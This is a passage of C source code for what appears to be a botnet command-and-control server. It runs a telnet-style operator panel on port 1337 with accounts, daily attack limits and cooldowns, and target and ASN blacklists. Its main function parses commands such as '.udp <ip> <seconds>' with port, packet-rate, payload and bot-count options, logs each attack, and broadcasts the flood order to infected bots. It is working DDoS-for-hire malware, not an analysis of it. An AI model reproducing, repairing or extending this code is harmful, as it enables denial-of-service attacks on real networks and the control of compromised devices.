                        else {
                            total += arch_info[i].count;
                            dprintf(user[loc].fd, "%s: %d\r\n", arch_info[i].arch, arch_info[i].count);
                        }
                    }
                }

                dprintf(user[loc].fd, "total: %d\r\n", total);
            }
        }

        else if (!strcmp(rcvbuf, "online")) {
            if (user[loc].id) {
                for (int i = 0; i < MAX_USERS; i++) {
                    if (user[i].connected)
                        dprintf(user[loc].fd, "%s: %s\r\n", user[i].username, inet_ntoa((struct in_addr){user[i].addr.sin_addr.s_addr}));
                }
            }
        }

        else if (!strcmp(rcvbuf, "accounts")) {
            if (user[loc].id) {
                load_accounts();

                for (int i = 0; i < MAX_USERS; i++) {
                    if (!account[i].username[0])
                        continue;

                    dprintf(user[loc].fd, "username: %s | id: %s | expiry: %s (%s)\r\n", account[i].username, get_user_id(account[i].id), account[i].expiry, is_expired_date(account[i].expiry) ? "inactive" : "active");
                }
            }
        }

        else if (!strcmp(rcvbuf, "ongoing")) {
            if (user[loc].id && attack_time > 0)
                dprintf(user[loc].fd, "user: %s | method: %s | target: %s | duration: %d/%d\r\n", ongoing.username, ongoing.method, ongoing.target, attack_time, ongoing.duration);
        }

        else if (!strcmp(rcvbuf, "toggle-attacks")) {
        
            if (user[loc].id == 2) {
                if (!attack_disabled) {
                    attack_disabled = TRUE;
                    dprintf(user[loc].fd, "attacks have been disabled\r\n");
                }
                else {
                    attack_disabled = FALSE;
                    dprintf(user[loc].fd, "attacks have been enabled\r\n");
                }

                FILE *fp = fopen("logs/toggle-attacks.txt", "a+");
                fprintf(fp, "%s:user %s toggled attacks %s\n", get_current_date(), user[loc].username, attack_disabled ? "off" : "on");
                fclose(fp);
            }
        }
        
        else if (!strncmp(rcvbuf, "blacklist ", 10)) {
        
            if (!user[loc].id) {
                dprintf(user[loc].fd, "no auth sar\r\n");
                
            } else {
            
                char *cmd = strtok(rcvbuf + 9, " ");
                char *entry = strtok(NULL, " ");
        
                if (!cmd || !entry) {
                
                    dprintf(user[loc].fd, "expected: blacklist add | del <ip / subnet>\r\n");
                    
                } else if (!strcmp(cmd, "add")) {
                
                    FILE *fp = fopen("blacktargs.txt", "a");
                    
                    if (!fp) {
                    
                        dprintf(user[loc].fd, "blacklist [open] errno 1\r\n");
                        
                    } else {
                    
                        fprintf(fp, "%s\n", entry);
                        fclose(fp);
                        dprintf(user[loc].fd, "added \"%s\" --> blacklist\r\n", entry);
                    }
                    
                } else if (!strcmp(cmd, "del")) {
                
                    FILE *fp = fopen("blacktargs.txt", "r");
                    
                    if (!fp) {
                    
                        dprintf(user[loc].fd, "blacklist [open] errno 2\r\n");
                        
                    } else {
                    
                        FILE *tmp = fopen("blacktargs.tmp", "w");
                        char line[128];
                        int found = 0;
        
                        while (fgets(line, sizeof(line), fp)) {
                        
                            line[strcspn(line, "\r\n")] = 0;
                            if (strcmp(line, entry) != 0)
                                fprintf(tmp, "%s\n", line);
                            else
                                found = 1;
                        }
        
                        fclose(fp);
                        fclose(tmp);
        
                        remove("blacktargs.txt");
                        rename("blacktargs.tmp", "blacktargs.txt");
        
                        dprintf(user[loc].fd, found ? "removed \"%s\" from blacklist\r\n" : "entry not found\r\n", entry);
                    }
                    
                } else {
                
                    dprintf(user[loc].fd, "sub cmd expected <add / del>\r\n");
                }
            }
        }

        else if (!strcmp(rcvbuf, "blacklisted")) {
        
            char ln[128];
        
            if (user[loc].id) {
            
                FILE *fp = fopen("blacktargs.txt", "r");
                if (!fp) {
                
                    dprintf(user[loc].fd, "blacklist [open] errno 3\r\n");
                    
                } else {
                
                    dprintf(user[loc].fd, "\r\n");
                    
                    while (fgets(ln, sizeof(ln), fp)) {
                    
                        ln[strcspn(ln, "\r\n")] = 0;
                        dprintf(user[loc].fd, "%s\r\n", ln);
                    }
                    
                    fclose(fp);
                }
            }
        }
        
        else if (!strncmp(rcvbuf, "find ", 5)) {
        
              if (user[loc].id) {
              
                  char *targ = rcvbuf + 5;
                  
                  if (strlen(targ) < 1) {
                  
                      dprintf(user[loc].fd, "find < substr >\r\n");
                      
                  } else {
                  
                      if (blist(targ)) {
                      
                          dprintf(user[loc].fd, "found target [TRUE]\r\n");
                          
                      } else {
                      
                          dprintf(user[loc].fd, "found target [FALSE]\r\n");
                      }
                  }
              }
          }

        else if (*rcvbuf == '.') {
            int argc = 0;
            char *token = strtok(rcvbuf + 1, " "), *argv[10] = {0}; // .udp 1.1.1.1 30 -dport=80 -len=512 -sport=80 -payload=r -bots=500 -group=selfrep

            while (token) {
                argv[argc] = token;

                if (++argc > 9)
                    break;

                token = strtok(NULL, " ");
            }

            if (argc < 3 || argc > 9) {
                dprintf(user[loc].fd, ".method ip seconds\r\n");
                continue;
            }

            int num = find_method(argv[0]);

            if (num == -1) {
                dprintf(user[loc].fd, "invalid method\r\n");
                continue;
            }

            if (!verify_ipv4(argv[1])) {
                dprintf(user[loc].fd, "invalid ipv4\r\n");
                continue;
            }


      char *tocheck = ip2asn(argv[1]); 

      if (tocheck && asn_blist(tocheck)) {

        dprintf(user[loc].fd, "Blacklist returned TRUE [ASN] | 黑名单返回 TRUE [ASN] \r\n");
        continue;
      }

      if (!user[loc].id && blist(argv[1])) {
      
        dprintf(user[loc].fd, "Blacklist returned TRUE [IPv4] | 黑名单返回 TRUE [IPv4] \r\n");
        continue;
      }

            int seconds = atoi(argv[2]);
            if (!str_is_num(argv[2]) || seconds < 1 || seconds > 60) {
                dprintf(user[loc].fd, "invalid seconds (1-60) | 无效秒数  \r\n");
                continue;
            }

            char group[32] = {0}, *payload = NULL;
            int rslp = 0, pps = 0, dport = 0, sport = 0, len = -1, payload_len = 0, bots = 0, current_bots = bots_connected(NULL);

            BOOL options = TRUE, success = TRUE;

            for (int i = 3; i < argc; i++) {
                if (*argv[i] != '-') {
                    options = FALSE;
                    break;
                }

                if (user[loc].id == 2) {
                    if (!strncmp(argv[i] + 1, "group=", 6)) {
                        int group_len = strlen(argv[i] + 7);

                        if (group_len < 1 || group_len > 32) {
                            dprintf(user[loc].fd, "invalid group len (1-32)\r\n");
                            success = FALSE;
                            break;
                        }
                        
                        BOOL found = FALSE;
                        strcpy(group, argv[i] + 7);

                        for (int i = 0; i < MAX_ARCHS; i++) {
		                    if (!strcmp(group, arch_info[i].arch)) {
                                found = TRUE;
                                break;
                            }
	                    }

                        if (!found) {
                            dprintf(user[loc].fd, "failed to find group \"%s\"\r\n", group);
                            success = FALSE;
                            break;
                        }

                        continue;
                    }
                }

                if (!strncmp(argv[i] + 1, "dport=", 6)) {
                    dport = atoi(argv[i] + 7);

                    if (!str_is_num(argv[i] + 7) || dport < 1 || dport > 65535) {
                        dprintf(user[loc].fd, "invalid dport (1-65535) | 目的端口无效\r\n");
                        success = FALSE;
                        break;
                    }
                }
                else if (!strncmp(argv[i] + 1, "sport=", 6)) {
                    sport = atoi(argv[i] + 7);

                    if (!str_is_num(argv[i] + 7) || sport < 1 || sport > 65535) {
                        dprintf(user[loc].fd, "invalid sport (1-65535) | 源端口无效\r\n");
                        success = FALSE;
                        break;
                    }
                }
                else if (!strncmp(argv[i] + 1, "len=", 4)) {
                    len = atoi(argv[i] + 5);

                    if (!str_is_num(argv[i] + 5) || len < 0 || len > 1400) {
                        dprintf(user[loc].fd, "invalid len (0-1400) - 0 randomizes | 无效数据包长度\r\n");
                        success = FALSE;
                        break;
                    }
                }
                
                else if (!strncmp(argv[i] + 1, "pps=", 4)) {
                    pps = atoi(argv[i] + 5);
                
                    if (!str_is_num(argv[i] + 5) || pps < 1 || pps > 1000000) {
                        dprintf(user[loc].fd, "invalid pps (1-1000000) | 每秒无效数据包\r\n");
                        success = FALSE;
                        break;
                    }
                }
                
                else if (!strncmp(argv[i] + 1, "payload=", 8)) {
                    payload = argv[i] + 9;
                    payload_len = strlen(payload);

                    if (payload_len < 1 || payload_len > 1400) {
                        dprintf(user[loc].fd, "invalid payload len (1-1400) | 有效负载长度无效\r\n");
                        success = FALSE;
                        break;
                    }
                }
                else if (!strncmp(argv[i] + 1, "bots=", 5)) {
                    bots = atoi(argv[i] + 6);

                    if (!str_is_num(argv[i] + 6) || bots < 1 || bots > current_bots) {
                        dprintf(user[loc].fd, "invalid bots (1-%d) | 无效的机器人计数设置\r\n", current_bots);
                        success = FALSE;
                        break;
                    }
                }
                else {
                    options = FALSE;
                    break;
                }
            }

            if (!success)
                continue;

            if (!options) {
                dprintf(user[loc].fd, "failed to parse command | 解析命令失败\r\n");
                continue;
            }

            if (len >= 0 && payload_len) {
                dprintf(user[loc].fd, "you cannot specify a len and a payload | 你不能指定长度和有效载荷\r\n");
                continue;
            }

            if (group[0] != '\0') {
                current_bots = bots_connected(group);
                if (bots > current_bots) {
                    dprintf(user[loc].fd, "invalid bots for group \"%s\" (1-%d)\r\n", group, current_bots);
                    continue;
                }
            }

            if (attack_time > 0) {
                dprintf(user[loc].fd, "there is currently an attack running for %d seconds | 目前正在发生攻击\r\n", attack_time);
                continue;
            }

            if (cooldown_time > 0) {
                dprintf(user[loc].fd, "there is currently a global cooldown for %d seconds | 目前有一个全局冷却时间\r\n", cooldown_time);
                continue;
            }

            if (user[loc].id != 2) {
                if (attack_disabled) {
                    dprintf(user[loc].fd, "attacks are currently disabled | 攻击目前已被禁用\r\n");
                    continue;
                }
            }

            if (user[loc].attacks_sent >= user[loc].daily_attacks) {
                dprintf(user[loc].fd, "you have reached your daily attack limit | 你已经达到每日攻击限制\r\n");
                continue;
            }

            if (user[loc].cooldown > 0) {
                dprintf(user[loc].fd, "you currently have a user cooldown for %d seconds\r\n", user[loc].cooldown);
                continue;
            }

            if (!bots)
                bots = current_bots;

            if (len == -1)
                len = payload_len ? payload_len : 512;

            attack_time = seconds;
            
            if (pps > 0) {
            
              rslp = 1000000 / pps;
              
            }

            char log_path[64] = {0};
            sprintf(log_path, "logs/attacks/%s.txt", user[loc].username);

            FILE *fp = fopen(log_path, "a+");
            fprintf(fp, "%s:%s:%d:%s %s %d %d %d %d %s\n", get_current_date(), user[loc].username, bots, argv[0], argv[1], seconds, dport, sport, len, payload);
            fclose(fp);

            sprintf(ongoing.username, "%s", user[loc].username);
            sprintf(ongoing.method, "%s", argv[0]);
            sprintf(ongoing.target, "%s", argv[1]);
            ongoing.duration = seconds;

            sprintf(rcvbuf, "%d %s %d %d %d %d %d %s", num, argv[1], seconds, dport, sport, len, rslp, payload);

            broadcast_cmd(rcvbuf, !group[0] ? NULL : group, bots);

            dprintf(user[loc].fd, "command sent to %d bots\r\n", bots);

            pthread_t thread;
            pthread_create(&thread, NULL, attack_timer, NULL);
            
            if (!user[loc].id)
                user[loc].cooldown = 90 + attack_time;
        }

        else if (!strcmp(rcvbuf, "exit") || !strcmp(rcvbuf, "logout"))
            goto label;
    }

label:
    close(user[loc].fd);
    memset(&user[loc], 0, sizeof(struct user_t));

    return NULL;
}

void user_acception(void) {

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd == -1) {
        printf("[user_acception] socket() failed\n");
        return;
    }

    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1) {
        printf("[user_acception] setsockopt() failed\n");
        return;
    }
    
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(1337),
        .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        printf("[user_acception] bind() failed\n");
        return;
    }

    if (listen(fd, SOMAXCONN) == -1) {
        printf("[user_acception] listen() failed\n");
        return;
    }

    printf("[user_accpetion] listen() on port: (%d)\n", ntohs(addr.sin_port));

    pthread_t thread;
    pthread_create(&thread, NULL, user_attacks, NULL);
    pthread_create(&thread, NULL, user_cooldown, NULL);
    pthread_create(&thread, NULL, title_writer, NULL);

    printf("[user_acception] setup title_writer() thread\n");

    int user_fd;
    socklen_t len = sizeof(addr);

    while (TRUE) {

        if ((user_fd = accept(fd, (struct sockaddr *)&addr, &len)) == -1) {
            printf("[user_acception] accept() failed\n");
            break;
        }

        int loc = setup_user_loc(user_fd, addr);

        if (loc == -1)
            continue;

        printf("[user_acception] accept() fd: (%d) | addr: (%s:%d)\n", user[loc].fd, inet_ntoa((struct in_addr){user[loc].addr.sin_addr.s_addr}), ntohs(user[loc].addr.sin_port));

        pthread_create(&thread, NULL, user_connection, &loc);
    }
}
